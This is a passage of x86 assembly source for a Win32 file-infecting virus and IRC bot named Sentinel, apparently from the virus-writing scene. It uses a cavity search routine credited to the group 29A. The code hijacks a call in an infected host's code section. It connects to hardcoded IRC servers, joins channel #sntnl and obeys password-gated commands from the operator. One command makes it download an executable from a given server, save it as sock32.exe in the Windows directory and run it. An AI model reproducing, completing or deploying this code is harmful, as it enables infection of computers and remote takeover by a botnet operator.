	mov edx, dword ptr [edi + 20d]			; RVA to raw data of code section
	add edx, [ebp + mapaddress]
	mov [ebp + epo_cs_pa], edx
	mov esi, edx

	mov eax, [ebp + ip_original]
	mov edx, [ebp + epo_cs_rva]
	sub eax, edx
	add esi, eax
	sub ecx, eax

	; esi = physical address to raw data of code section
	; ecx = size of raw data of code section

    ScanForOpcode:
	lodsw
	dec esi

	cmp word ptr [ebp + epo_opcode], ax
	je FoundOpcode
	loop ScanForOpcode
	xor eax, eax					; eax = 0 = error
	jmp ExitEpoRoutine				; not found

    FoundOpcode:
	dec ecx
	push esi
	push ecx
	inc esi

	; esi = physical address of [xxxx] in code section

    ExamineAddress:
	mov [ebp + epo_aoc_pa], esi			; address of call
	mov eax, dword ptr [esi]
	mov [ebp + epo_awaa_va], eax			; address where api address

	;pushad
	;call MSG_BEEP
	;popad

	; on stack: esi, ecx

    GetRVAImportTable:
	mov esi, [ebp + PEheader]
	mov eax, [esi + 80h]				; rva of import table
	call FIND_SECTION
	or eax, eax	
	jz NotFound

	; edx = va of import section
	; ecx = size of import section
	; on stack: esi, ecx

    CompareAddressToImportAddress:
	mov esi, [ebp + epo_awaa_va]
	cmp edx, esi
	jb CheckNotAbove
	jmp NotFound	

    CheckNotAbove:
	add edx, ecx
	cmp edx, esi
	ja FoundGoodInsertionPoint

    NotFound:
	pop ecx
	pop esi
	jmp ScanForOpcode

    FoundGoodInsertionPoint:
	mov eax, 0ah
	call GET_RANDOM_NUMBER_WITHIN
	cmp eax, 3h
	ja NotFound

	pop ecx
	pop esi
	mov eax, 01h

	; eax == 0 -> error
	; eax == 1 -> found

    ExitEpoRoutine:
	ret

CREATE_EPO endp

FIND_USER32_BASE_ADDRESS proc 

    GetUser32Base:
	lea eax, [ebp + user32]				
	push eax					
	lea eax, [ebp + ALoadLibrary]			
	call GETAPI					
	mov [ebp + user32address], eax
	ret

FIND_USER32_BASE_ADDRESS endp

FIND_WSOCK32_BASE_ADDRESS proc

    LoadWsock32:
	lea eax, [ebp + wsock32]			; not found, then
	push eax					; load the dll
	lea eax, [ebp + ALoadLibrary]			; first
	call GETAPI
	mov [ebp + wsock32address], eax
	ret

FIND_WSOCK32_BASE_ADDRESS endp

FIND_SECTION proc

    ; In:  eax - rva somewhere in section
    ; Out: edx - va of section start
    ; Out: ecx - size of section
    ; out: edi - va of section header

    FindFirstSectionHeader:
	mov esi, [ebp + mapaddress]
	add esi, dword ptr [esi + 3ch]			; esi=offset peheader
	movzx ecx, word ptr [esi + 06h]			; ecx = nr. of sections
	movzx edi, word ptr [esi + 20d]			; optional header size
	add esi, 24d					; file header size
	add edi, esi					

	; edi points to first section header

    FindCorrespondingSection:
	push eax
	mov edx, dword ptr [edi + 12d]			; section RVA
	sub eax, edx
	cmp eax, dword ptr [edi + 08d]			; section size
	jb SectionFound

    NotThisSection: 
	pop eax
	add edi, 40d
	loop FindCorrespondingSection

    EndSectionSearch:
	xor eax, eax
	ret

    SectionFound:
	pop eax
	mov edx, dword ptr [edi + 12d]	
	add edx, [ebp + imagebase]		
	mov ecx, dword ptr [edi + 08d]			
	ret

FIND_SECTION endp

GET_RANDOM_NUMBER proc

	push    eax ebx
	lea eax, [ebp + AGetTickCount]
	call GETAPI

	lea     ebx, [ebp + random_number]      ; EBX = pointer to random_number
	mul     dword ptr [ebx]         	; Multiply previous miliseconds with
	sbb     edx,eax              	 	; Add low-order word of 32-bit random
	cmc                          		; Complement carry flag
	adc     [ebx],edx            		; Store 32-bit random number
	pop     ebx eax
	ret

GET_RANDOM_NUMBER endp

GET_RANDOM_NUMBER_WITHIN proc

	push    ebx
	call    GET_RANDOM_NUMBER
	xchg    eax,ebx                 ; EBX = number in range
	xor     eax,eax                 ; Zero EAX
	xchg    eax,edx                 ; EDX = 32-bit random number
	div     ebx                     ; EAX = random number within range
	pop     ebx
	xchg eax, edx
	ret

GET_RANDOM_NUMBER_WITHIN endp


CAVITYSEARCH proc

;-----------------------------------------------------------------------------
; Cavity search engine by Benny and Darkman of 29A
;
; Calling parameters:
; ECX = size of search area
; ESI = pointer to search area
;
; Return parameters:
; ESI = pointer to cave

    CSE:
	pushad	
	mov ebp, 14d			; EBP = size of cave wanted	
	lodsb				; AL = byte within search area	

    reset_cavity_loop:
	xchg	eax,ebx			; BL =  "     "      "     "	
	xor	edx,edx			; Zero EDX	
	dec	ecx			; Decrease counter	
	cmp	ecx,ebp			; Unsearched search area large enough?	
	jb	no_cave_found		; Below? Jump to no_cave_found

    find_cave_loop:		
	lodsb				; AL = byte within search area	
	cmp	al,bl			; Current byte equal to previous byte?	
	jne	reset_cavity_loop	; Not equal? Jump to reset_cavity_loop	
	inc	edx			; Increase number of bytes found in	
					; cave	
	cmp	edx,ebp			; Found a cave large enough?	
	jne	find_cave_loop		; Not equal? Jump to find_cave_loop
	sub	esi,ebp			; ESI = pointer to cave	
	jmp 	exit_cave

    no_cave_found:
	xor esi, esi

    exit_cave:
	mov	[esp + 4],esi
	popad	
	ret

;-----------------------------------------------------------------------------

CAVITYSEARCH endp


names 	dd  30d
name1 	db  'pion',0
name2 	db  'sarge',0
name3 	db  'blink',0
name4 	db  'midge',0
name5 	db  'xaero',0
name6 	db  'void',0
name7 	db  'vivid',0
name8 	db  'xeon',0
name9 	db  'n0bs',0
name10 	db  'helios',0
name11 	db  'phobos',0
name12 	db  'flux',0
name13 	db  'hypno',0
name14 	db  'bond',0
name15 	db  'chaos',0
name16 	db  'blup',0
name17 	db  'sntnl',0
name18 	db  'fire',0
name19 	db  'water',0
name20 	db  'earth',0
name21 	db  'heart',0
name22 	db  'stone',0
name23 	db  'light',0
name24 	db  'love',0
name25 	db  'silver',0
name26 	db  'surfer',0
name27 	db  'panic',0
name28 	db  'm00dy',0
name29 	db  'texas',0
name30 	db  'snow',0
name31 	db  'beta',0

servers dd 04d
server1 db "195.112.4.25",0
server2 db "195.159.135.99",0
server3 db "195.121.6.196",0
server4 db "154.11.89.164",0
server5 db "205.188.149.3",0

port1 dd 7000d
port2 dd 6660d
port3 dd 6660d
port4 dd 6661d
port5 dd 6667d

GET_ITEM_FROM_LIST proc

	; IN:	eax = total number of items
	;	esi = offset of first item
	; OUT:  esi = pntr to start of item
	;	ecx = size of item
	;	eax = random number

    GetItemFromList:
	push edi
	push esi
	call GET_RANDOM_NUMBER_WITHIN
	mov ecx, eax
	pop esi
	push eax
	or ecx, ecx
	jz GetSizeOfItem

    GetPositionOfItem:
	push ecx
	call GET_STRING_SIZE
	add esi, ecx
	inc esi
	pop ecx
	loop GetPositionOfItem

    GetSizeOfItem:
	call GET_STRING_SIZE
	pop eax
	pop edi
	ret

GET_ITEM_FROM_LIST endp

IRC_LAUNCH proc 

    IRCLaunch:
	cmp [ebp + ircstatus], 00h
	je CreateIRCThread
	ret

    CreateIRCThread:
	lea eax, [ebp + ircthreadid]			
	push eax					
	push 00h
	push 01h
	lea eax, [ebp + IRC_THREAD]
	push eax
	push 00h
	push 00h
	lea eax, [ebp + ACreateThread]
	call GETAPI
	mov [ebp + ircstatus], 01h
	ret

IRC_LAUNCH endp

IRC_THREAD proc handle: dword

    IrcThreadEntryPoint:
	pushad
	call GetIrcDelta

    GetIrcDelta:
	pop ebp
	sub ebp, offset GetIrcDelta

    GetWSock32Base:
	call FIND_GETPROCADDRESS_API_ADDRESS
	call FIND_WSOCK32_BASE_ADDRESS

    LoadWinInetDll:
	lea eax, [ebp + wininet]
	push eax
	lea eax, [ebp + ALoadLibrary]
	call GETAPI
	or eax, eax
	jz UserIsOffline

    FindConnectionApiAddress:
	lea ebx, [ebp + AInternetGetConnectedState]
	push ebx
	push eax
	call [ebp + AGetProcAddressA]
	or eax, eax
	jz UserIsOffline

    CheckConnection:
	push 00h
	lea ebx, [ebp + buffer]
	push ebx
	call eax
	or eax, eax
	jnz UserIsOnline
 
    UserIsOffline:
	push 10000h
	lea eax, [ebp + ASleep]
	call GETAPI
	jmp LoadWinInetDll

    UserIsOnline:
	lea eax, [ebp + mywsadata]
	push eax
	push 101h
	lea eax, [ebp + AWSAStartup]
	call GETWAPI

    OpenSocket:
	push 00h
	push SOCK_STREAM
	push AF_INET
	lea eax, [ebp + Asocket]
	call GETWAPI
	mov [ebp + socketh], eax

    GetSocketValues:
	mov [ebp + mysocket.sin_family], AF_INET
	mov eax, [ebp + servers]
	lea esi, [ebp + server1]
	call GET_ITEM_FROM_LIST 
	push esi
	push ecx

    GetPort:
	lea esi, [ebp + port1]
	mov ecx, 04
	mul ecx
	add esi, eax
	mov edx, dword ptr [esi]

	push edx
	lea eax, [ebp + Ahtons]
	call GETWAPI
	mov [ebp + mysocket.sin_port], ax

	pop ecx
	lea eax, [ebp + Ainet_addr]
	call GETWAPI
	mov [ebp + mysocket.sin_addr], eax

    Connect:
	push 10h
	lea eax, [ebp + mysocket]
	push eax
	push [ebp + socketh]
	lea eax, [ebp + Aconnect]
	call GETWAPI
	test eax, eax
	jnz Connect

    LogonToIrcServer:
	call LOGON

    DoTheLoop:
	call IRC_RECEIVE
	or eax, eax
	jz CloseSocket
	jmp DoTheLoop
	
    CloseSocket:
	push [ebp + socketh]
	lea eax, [ebp + Aclosesocket]
	call GETWAPI

    WSACleanUp:
	lea eax, [ebp + AWSACleanup]
	call GETWAPI
                                         
    ExitThread:
	popad
	ret

IRC_THREAD endp

LOGON proc near

	call IRC_RECEIVE

    SendNick:
	lea edi, [ebp + offset buffer]
	lea esi, [ebp + offset nick]
	mov ecx, 05h
	rep movsb
	lea esi, [ebp + name1]
	mov eax, [ebp + names]
	call GET_ITEM_FROM_LIST
	rep movsb
	mov ebx, 10d
	call GET_RANDOM_NUMBER_WITHIN
	add eax, 48d
	mov byte ptr [edi], al
	inc edi
	mov ebx, 10d
	call GET_RANDOM_NUMBER_WITHIN
	add eax, 48d
	mov byte ptr [edi], al
	inc edi
	lea esi, [ebp + crlf]
	mov ecx, 03h
	rep movsb
	lea esi, [ebp + buffer]
	call GET_STRING_SIZE
	call IRC_SEND

	call IRC_RECEIVE

    SendUser:
	lea edi, [ebp + buffer]
	lea esi, [ebp + user1]
	mov ecx, 05d
	rep movsb
	call CREATE_RANDOM_NAME
	lea esi, [ebp + user2]
	mov ecx, 18d
	rep movsb
	lea esi, [ebp + buffer]
	call GET_STRING_SIZE
	call IRC_SEND

	call IRC_RECEIVE
	call IRC_RECEIVE
	
    SendJoin:
	lea esi, [ebp + join]
	mov ecx, 13d
	call IRC_SEND

    PostVersionMessage:
	call .PostVersion

    LogonDone:
	ret

LOGON endp

IRC_RECEIVE proc

	push 00h
	push 400h
	lea eax, [ebp + buffer]
	push eax
	push [ebp + socketh]
	lea eax, [ebp + ARecv]
	call GETWAPI
	mov [ebp + nrbytes], eax
	call IRC_SCANBUFFER
	ret

IRC_RECEIVE endp

IRC_SEND proc

	; esi = snd buffer
	; ecx = size to send

	push 00h
	push ecx
	push esi
	push [ebp + socketh]
	lea eax, [ebp + ASend]
	call GETWAPI
	ret

IRC_SEND endp


.PostVersion:
	lea edi, [ebp + buffer]
	lea esi, [ebp + post]
	mov ecx, 16d
	rep movsb
	lea esi, [ebp + post_vers]
	mov ecx, 5d
	rep movsb
	lea esi, [ebp + version]
	mov ecx, 4d
	rep movsb
	lea esi, [ebp + crlf]
	mov ecx, 03d
	rep movsb
	lea esi, [ebp + buffer]
	call GET_STRING_SIZE
	call IRC_SEND
	ret

.RespondPing:
	lea edi, [ebp + buffer]
	lea esi, [ebp + pong]
	mov ecx, 04h
	rep movsb
	mov ecx, [ebp + nrbytes]
	lea esi, [ebp + buffer]
	call IRC_SEND

.RespondPing_End:
	ret

IRC_SCANBUFFER proc

	; IN 	esi: buffer start
	;	ecx: buffer size

    ScanDaBuffer:
	mov ecx, [ebp + nrbytes]
	lea esi, [ebp + buffer]

    .PingPongMessage:
	cmp dword ptr [esi], 'GNIP'
	jne GetReplyNick
	call .RespondPing
	jmp EndLoop

    GetReplyNick:
	jecxz EndLoop
	inc esi
	dec ecx
	cmp byte ptr [esi], '!'
	je ExtractReplyNick
	cmp byte ptr [esi], ':'
	je EndLoop
	jmp GetReplyNick

    ExtractReplyNick:
	push esi
	push ecx
	mov ecx, esi
	lea esi, [ebp + buffer]
	sub ecx, esi
	dec ecx
	inc esi
	lea edi, [ebp + replynick]	
	rep movsb
	mov byte ptr [edi], 00h
	pop ecx
	pop esi
	
    ScanLoop:
	jecxz EndLoop
	cmp dword ptr [esi], 'VIRP'
	je SearchTextStart
	inc esi
	dec ecx
	jmp ScanLoop

    SearchTextStart:
	jecxz EndLoop
	cmp byte ptr [esi], ':'
	je .CommandMessage
	inc esi
	dec ecx
	jmp SearchTextStart

    .CommandMessage:
	inc esi
	dec ecx
	cmp dword ptr [esi], 's54p'
	jne EndLoop

    GetText:
	add esi, 5
	sub ecx, 5
	cmp byte ptr [esi], '/'
	jne EndLoop

    CheckIncomingCommandMessage:
	inc esi
	dec ecx
	cmp dword ptr [esi], 'kc1n'
	je CreateRandomNick
	cmp dword ptr [esi], 't1uq'
	je QuitIrc
	cmp dword ptr [esi], 'c3xe'
	je LaunchInstaller
	cmp dword ptr [esi], 't4ts'
	je InstallerStatus
	call IRC_SEND
	jmp EndLoop

    CreateRandomNick:
	lea edi, [ebp + mynick]
	call CREATE_RANDOM_NAME
	mov byte ptr [edi], 00h
	lea edi, [ebp + buffer]
	mov dword ptr [edi], 'KCIN'
	add edi, 04h
	mov byte ptr [edi], ' '
	inc edi
	lea esi, [ebp + mynick]
	call GET_STRING_SIZE
	rep movsb
	lea esi, [ebp + crlf]
	mov ecx, 03h
	rep movsb
	lea esi, [ebp + buffer]
	call GET_STRING_SIZE
	call IRC_SEND
	jmp EndLoop

    QuitIrc:
	lea esi, [ebp + quit]
	mov ecx, 06h
	call IRC_SEND
	xor eax, eax
	jmp EndLoop

    LaunchInstaller:
	call INSTALLER_LAUNCH
	jmp EndLoop
    
    InstallerStatus:
	call INSTALLER_STATUS

    EndLoop:
	ret

IRC_SCANBUFFER endp


	version				db "0101",0
	post				db "PRIVMSG #sntnl :",0
	post_vers			db "vers ",0
	mynick				db 5h dup(0)
	replynick			db 5h dup(0)

	nrbytes				dd 0
	ircstatus			dd 0
	ircthreadid			dd 0

	wsock32 			db "WSOCK32.dll",0
	wininet				db "WININET.dll",0

	ASend 				db "send",0
	ARecv 				db "recv",0
	AWSAGetLastError 		db "WSAGetLastError",0
	AWSAGetLastErrorA 		dd 0
	AInternetGetConnectedState	db "InternetGetConnectedState",0
	ACreateThread			db "CreateThread",0
	AWSAStartup			db "WSAStartup",0
	AWSACleanup			db "WSACleanup",0
	Asocket				db "socket",0
	Aconnect			db "connect",0
	Aclosesocket			db "closesocket",0
	Ahtons				db "htons",0
	Ainet_addr			db "inet_addr",0
	AGetTickCount			db "GetTickCount",0
	AGetLastError			db "GetLastError",0
	ASleep				db "Sleep",0

	random_number 			dd 01234567h
	ipaddress 			db "212.43.217.183",0
	
	; if the bot does not appear online in #sentinel, try using a different
	; server ip-address.

	user1 				db "USER ",0
	user2				db " bb cc sentinel",0dh,0ah
	nick 				db "NICK ",0
	pong				db "PONG",0
	join 				db "JOIN #sntnl",0dh,0ah
	quit				db "QUIT",0dh,0ah
	crlf				db 0dh, 0ah,0
	dots				db ' :',0
	socketh 			dd 0
	buffer				db 400h dup(0)

	mywsadata 			WSADATA <>
	mysocket 			SOCKADDR <>

CREATE_RANDOM_NAME proc

    ; IN: edi = place to put 5 rnd chars

	call GetRandomChar
	call GetRandomChar
	call GetRandomChar
	call GetRandomChar
	call GetRandomChar
	ret

    GetRandomChar:
	mov eax, 26d
	call GET_RANDOM_NUMBER_WITHIN
	add eax, 97d
	mov byte ptr [edi], al
	inc edi
	ret

CREATE_RANDOM_NAME endp

GET_STRING_SIZE proc

    GetStringSize:
	xor ecx, ecx
    
    SearchEndOfString:
	cmp byte ptr [esi + ecx], 0h
	je StringSizeFound
	inc ecx
	jmp SearchEndOfString

    StringSizeFound:
	ret

GET_STRING_SIZE endp

INSTALLER_LAUNCH proc

    LaunchTheInstaller:
	add esi, 05h
	sub ecx, 05h

    GetServerValue:
	cmp byte ptr [esi], '['
	jne ExitInstallerLaunch
	inc esi

    FoundServerValueStart:
	mov edi, esi
	xor edx, edx

    GetServerLoop:
	cmp byte ptr [esi], ']'
	je StoreServerValue
	inc esi
	inc edx
	dec ecx
	cmp ecx, 00h
	je ExitInstallerLaunch
	jmp GetServerLoop

    StoreServerValue:
	mov esi, edi
	push ecx
	lea edi, [ebp + installer_server]
	mov ecx, edx
	rep movsb
	pop ecx

    GetGetCommand:
	cmp byte ptr [esi], '['
	je FilterGetCommand
	inc esi
	dec ecx
	cmp ecx, 00h
	je ExitInstallerLaunch
	jmp GetGetCommand

    FilterGetCommand:
	inc esi
	mov edi, esi
	xor edx, edx

    GetCommandLoop:
	cmp byte ptr [esi], ']'
	je SaveGetCommand
	inc esi
	inc edx
	dec ecx
	cmp ecx, 00h
	je ExitInstallerLaunch
	jmp GetCommandLoop

    SaveGetCommand:
	mov [ebp + installer_getsize], edx
	mov esi, edi
	mov ecx, edx
	lea edi, [ebp + installer_get]
	rep movsb

    InstallerGo:
	mov [ebp + installer_launchstatus], 00h
	lea eax, [ebp + installerthreadid]
	push eax
	push 00h
	push 1234567h
	lea eax, [ebp + INSTALLER_THREAD]
	push eax
	push 10000h
	push 00h
	lea eax, [ebp + ACreateThread]
	call GETAPI
	
    ExitInstallerLaunch:
	ret

INSTALLER_LAUNCH endp

INSTALLER_RECEIVE proc

    SaveStack:
	pushad

    ReceiveData:
	push edi
	mov eax, [ebp + nrbytes2]
	mov esi, dword ptr [ebp + dmHnd]
	add esi, eax
	push 00h
	push edi
	push esi
	push [ebp + isocketh]
	lea eax, [ebp + ARecv]
	call GETWAPI
	add [ebp + nrbytes2], eax
	pop edi

	mov ecx, eax
	inc ecx
	jnz InstallerProceed

	call [ebp + AWSAGetLastErrorA]
	cmp eax,2733h
	je ReceiveData

    InstallerProceed:
	popad
	ret

INSTALLER_RECEIVE endp

INSTALLER_STATUS proc

     CheckInstallerStatus:
	cmp [ebp + installer_launchstatus], 00h
	je StatusWaiting
	cmp [ebp + installer_launchstatus], 01h
	je StatusInstalling
	cmp [ebp + installer_launchstatus], 02h
	je StatusDone
	cmp [ebp + installer_launchstatus], 03h
	je StatusConnectionError
	cmp [ebp + installer_launchstatus], 04h
	je StatusSizeError
	jmp ExitInstallerStatus

    StatusWaiting:
	push 00h
	push 28d
	lea eax, [ebp + installer_stat00]
	push eax
	push [ebp + socketh]
	lea eax, [ebp + ASend]
	call GETWAPI
	jmp ExitInstallerStatus

   StatusInstalling:
	push 00h
	push 31d
	lea eax, [ebp + installer_stat01]
	push eax
	push [ebp + socketh]
	lea eax, [ebp + ASend]
	call GETWAPI	
	jmp ExitInstallerStatus

   StatusDone:
	push 00h
	push 25d
	lea eax, [ebp + installer_stat02]
	push eax
	push [ebp + socketh]
	lea eax, [ebp + ASend]
	call GETWAPI
	jmp ExitInstallerStatus

   StatusConnectionError:
	push 00h
	push 38d
	lea eax, [ebp + installer_stat03]
	push eax
	push [ebp + socketh]
	lea eax, [ebp + ASend]
	call GETWAPI
	jmp ExitInstallerStatus

   StatusSizeError:
	push 00h
	push 31d
	lea eax, [ebp + installer_stat04]
	push eax
	push [ebp + socketh]
	lea eax, [ebp + ASend]
	call GETWAPI

    ExitInstallerStatus:
	ret

INSTALLER_STATUS endp

INSTALLER_THREAD proc handle: dword

   GetInstallerDelta:
	pushad
	call InstallerDelta

   InstallerDelta:
	pop ebp
	sub ebp, offset InstallerDelta

    AllocateExeMem:
	push 1000000h
	push GMEM_FIXED
	lea eax, [ebp + AGlobalAlloc]
	call GETAPI

	mov [ebp + dmHnd], eax
	or eax, eax
	jz ExitInstaller

    InstallerWsaStartup:
	lea eax, [ebp + mywsadata]
	push eax
	push 101h
	lea eax, [ebp + AWSAStartup]
	call GETWAPI

    InstallerOpenSocket:
	push 00h
	push 01h
	push 02h
	lea eax, [ebp + Asocket]
	call GETWAPI
	mov [ebp + isocketh], eax

    InstallerGetSocketValues:
	mov [ebp + mysocket2.sin_family], 02h
	push 80
	lea eax, [ebp + Ahtons]
	call GETWAPI
	mov [ebp + mysocket2.sin_port], ax

	lea eax, [ebp + installer_server]
	push eax
	lea eax, [ebp + Ainet_addr]
	call GETWAPI
	mov [ebp + mysocket2.sin_addr], eax
	xor ecx, ecx
 
    InstallerConnect:
	cmp ecx, 03h
	je InstallerConnectionError
	push ecx

	push 10h
	lea eax, [ebp + mysocket2]
	push eax
	push [ebp + isocketh]
	lea eax, [ebp + Aconnect]
	call GETWAPI

	pop ecx
	or eax, eax
	jz InstallerSendGetCommand
	inc ecx
	jmp InstallerConnect

    InstallerConnectionError:
	mov [ebp + installer_launchstatus], 03h
	jmp ExitInstaller

    InstallerSendGetCommand:
	push 00h
	push [ebp + installer_getsize]
	lea eax, [ebp + installer_get]
	push eax
	push [ebp + isocketh]
	lea eax, [ebp + ASend]
	call GETWAPI

	push 00h
	push 02h
	lea eax, [ebp + crlf]
	push eax
	push [ebp + isocketh]
	lea eax, [ebp + ASend]
	call GETWAPI

	push 00h
	push 02h
	lea eax, [ebp + crlf]
	push eax
	push [ebp + isocketh]
	lea eax, [ebp + ASend]
	call GETWAPI

	mov [ebp + installer_launchstatus], 01h
	mov [ebp + nrbytes2], 00h
	mov ecx, 1000000h

    ReceiveLoop:
	cmp ecx, 400h
	jna LastPart
	sub ecx, 400h
	mov edi, 400h
	call INSTALLER_RECEIVE
	jmp ReceiveLoop

    LastPart:
	mov edi, ecx
	call INSTALLER_RECEIVE

    SearchMz:
	xor ecx, ecx
	mov edi, dword ptr [ebp + dmHnd]

    MzLoop:
	cmp word ptr [edi], 'ZM'
	je FoundExeMark
	inc edi
	inc ecx

	cmp ecx, 200h
	ja SearchZm
	jmp MzLoop

    SearchZm:
	xor ecx, ecx
	mov edi, dword ptr [ebp + dmHnd]

    ZmLoop:
	cmp word ptr [edi], 'MZ'
	je FoundExeMark
	inc edi
	inc ecx

	cmp ecx, 200h
	ja InstallerCloseSocket
	jmp ZmLoop
	
    FoundExeMark:
	mov [ebp + skip], ecx

    ZeroWindirString:
	mov ecx, 100h
	xor eax, eax
	lea edi, [ebp + windir]
	rep stosb

    InstallerGetSetWindowsDirectory:
	call GET_WINDIR
	call SET_WINDIR

	push 00h
	push 20h
	push 02h
	push 00h
	push 01h
	push 80000000h or 40000000h
	lea eax, [ebp + commandline]
	push eax
	lea eax, [ebp + ACreateFile]
	call GETAPI
	mov [ebp + ifilehandle], eax

	push 02h
	push 00h
	push 00h
	push eax
	lea eax, [ebp + ASetFilePointer]
	call GETAPI
	
	mov edi, dword ptr [ebp + dmHnd]
	add edi, [ebp + skip]
	mov ebx, [ebp + nrbytes2]
	sub ebx, [ebp + skip]

	push 00h
	lea edx, [ebp + bytesread]
	push edx
	push ebx
	push edi
	push [ebp + ifilehandle]
	lea eax, [ebp + AWriteFile]
	call GETAPI	

    InstallerGetRealSize:
	lea ebx, [ebp + irealsize]
	push ebx
	push [ebp + ifilehandle]
	lea eax, [ebp + AGetFileSize]
	call GETAPI
	mov [ebp + irealsize], eax	

    InstallerCloseFile:
	push [ebp + ifilehandle]
	lea eax, [ebp + ACloseHandle]
	call GETAPI

    GetFileSize:
	mov edi, dword ptr [ebp + dmHnd]
	xor ecx, ecx

    InstallerFileSizeLoop:
	cmp dword ptr [edi], ':htg'
	je InstallerFoundSize
	inc ecx
	inc edi
	cmp ecx, 200h
	je InstallerCloseSocket
	jmp InstallerFileSizeLoop

    InstallerFoundSize:
	xor ecx, ecx
	add edi, 05h
	mov [ebp + sizestart], edi

    ExtractFileSizeLoop:
	cmp word ptr [edi], 0a0dh
	je FoundEndOfSizeString
	inc edi
	inc ecx
	cmp ecx, 10h
	je InstallerCloseSocket
	jmp ExtractFileSizeLoop

    FoundEndOfSizeString:
	cld
	mov [ebp + sizesize], ecx
	mov [ebp + ifilesize], 00h
	mov ebx, 01h
	mov esi, [ebp + sizestart]
	add esi, ecx
	sub esi, 01h
	
    Convert2Int:
	xor eax, eax
	lodsb
	sub eax,'0'
	mul ebx
	add [ebp + ifilesize], eax
	add edx, eax
	dec esi
	dec esi
	dec ecx
	cmp ecx, 00h
	je InstallerCheckFileSize
	push ecx
	push esi
	mov ecx, 10d
	mov eax, ebx
	mul ecx
	mov ebx, eax
	pop esi
	pop ecx
	jmp Convert2Int

    InstallerCheckFileSize:
	mov esi, [ebp + ifilesize]
	mov edi, [ebp + irealsize]
	cmp esi, edi
	je ExecuteFile
	mov [ebp + installer_launchstatus], 04h
	jmp InstallerCloseSocket
 
    ExecuteFile:
	lea eax, [ebp + lpProcessInformation]
	push eax
	lea eax, [ebp + lpStartupInfo]
	push eax
	push 00h
	push 00h
	push CREATE_DEFAULT_ERROR_MODE
	push FALSE
	lea eax, [ebp + lpThreadAttributes]
	push eax
	lea eax, [ebp + lpProcessAttributes]
	push eax
	lea eax, [ebp + commandline]
	push eax
	push 00h
	lea eax, [ebp + ACreateProcess]
	call GETAPI
	mov [ebp + installer_launchstatus], 02h

    InstallerCloseSocket:
	push [ebp + isocketh]
	lea eax, [ebp + Aclosesocket]
	call GETWAPI

	lea eax, [ebp + AWSACleanup]
	call GETWAPI

    ExitInstaller:
	popad
	ret
   
INSTALLER_THREAD endp

FALSE   =       0
	TRUE    =       1

	lpProcessInformation 		PROCESS_INFORMATION <>
	lpStartupInfo 			STARTUPINFO <>
	lpThreadAttributes 		SECURITY_ATTRIBUTES <>
	lpProcessAttributes 		SECURITY_ATTRIBUTES <>
	mysocket2			SOCKADDR <>

	AWriteFile 			db "WriteFile",0
	ACreateProcess			db "CreateProcessA",0
	AGlobalAlloc 			db "GlobalAlloc",0
	

	commandline			db "sock32.exe",0

	windir 				db 100h dup(0)
	skip				dd 0
	sizestart			dd 0
	sizesize			dd 0
	bytesread			dd 0
	nrbytes2			dd 0

	dmHnd           		dd 0
	ifilehandle			dd 0
	ifilesize		 	dd 0
	irealsize 			dd 0
	isocketh			dd 0

	installerthreadid		dd 0

	installer_server 		db 20h dup(0)
	installer_get 			db 100h dup(0)
	installer_serversize 		dd 0
	installer_getsize 		dd 0
	installer_launchstatus 		dd 0
	installer_stat00 		db "PRIVMSG #sntnl :Waiting...",0dh,0ah
	installer_stat01 		db "PRIVMSG #sntnl :Installing...",0dh,0ah
	installer_stat02 		db "PRIVMSG #sntnl :Done...",0dh,0ah
	installer_stat03 		db "PRIVMSG #sntnl :Unable to connect...",0dh,0ah
	installer_stat04 		db "PRIVMSG #sntnl :Size error...",0dh,0ah

GET_WINDIR proc

    GetWindowsDir:
	push 128h					; size of dirstring		
	lea eax, [ebp + windir]				; save it here
	push eax
	lea eax, [ebp + AGetWindowsDirectory]		; get windowsdir
	call GETAPI
	ret

GET_WINDIR endp

SET_WINDIR proc

    SetWindowsDir:
	lea eax, [ebp + windir]				; change to sysdir
	push eax
	lea eax, [ebp + ASetCurrentDirectory]	
	call GETAPI
	ret

SET_WINDIR endp

;========================================================================;

    Leap:

.code

    OriginalHost:
	pop ebx

	push 00h
	call ExitProcess

end FirstCopy
end
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[SENTINEL.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[MYINC.INC]컴�
GMEM_FIXED      =   0000h


LPVOID				typedef	DWORD		;long ptr to buffer
BOOL				typedef DWORD		;boolean variable
HANDLE				typedef DWORD		;unspecified handle
LPSTR				typedef DWORD		;long ptr to string
LPBYTE				typedef DWORD		;long ptr to byte
ACHAR				typedef	BYTE		;ansi character
CHAR				textequ	<ACHAR>		;ansi char type
CHAR_				equ	1		;ansi char size

CREATE_DEFAULT_ERROR_MODE	equ	04000000h

SECURITY_ATTRIBUTES_	equ	  4+4+4
SECURITY_ATTRIBUTES	struct
sa_nLength		DWORD	  SECURITY_ATTRIBUTES_ ;structure size
sa_lpSecurityDescriptor	LPVOID	  0		;security descriptor
sa_bInheritHandle	BOOL	  0		;handle inheritance flag
SECURITY_ATTRIBUTES	ends

PROCESS_INFORMATION	struct
pi_hProcess		HANDLE	  0		;process handle
pi_hThread		HANDLE	  0		;thread handle
pi_dwProcessId		DWORD	  0		;process id
pi_dwThreadId		DWORD	  0		;thread id
PROCESS_INFORMATION	ends
PROCESS_INFORMATION_	equ	  4+4+4+4

STARTUPINFO		struct
si_cb			DWORD	  0		;structure size
si_lpReserved		LPSTR	  0		;(reserved)
si_lpDesktop		LPSTR	  0		;desktop name
sl_lpTitle		LPSTR	  0		;console window title
si_dwX			DWORD	  0		;window origin (column)
si_dwY			DWORD	  0		;window origin (row)
si_dwXSize		DWORD	  0		;window width
si_dwYSize		DWORD	  0		;window height
si_dwXCountChars	DWORD	  0		;screen buffer width
si_dwYCountChars	DWORD	  0		;screen buffer height
si_dwFillAttribute	DWORD	  0		;console window initialization
si_dwFlags		DWORD	  0		;structure member flags
si_wShowWindow		WORD	  0		;ShowWindow() parameter
si_cbReserved2		WORD	  0		;(reserved)
si_lpReserved2		LPBYTE	  0		;(reserved)
si_hStdInput		HANDLE	  0		;standard input handle
si_hStdOutput		HANDLE	  0		;standard output handle
si_hStdError		HANDLE	  0		;standard error handle
STARTUPINFO		ends
STARTUPINFO_		equ	  4+4+4+4+4+4+4+4+4+4+4+4+2+2+4+4+4+4


WIN32_FIND_DATA_	equ	  4+8+8+8+4+4+4+4+(260*CHAR_)+(14*CHAR_)
WIN32_FIND_DATA		struct
fd_dwFileAttributes	DWORD	  0		;file attributes
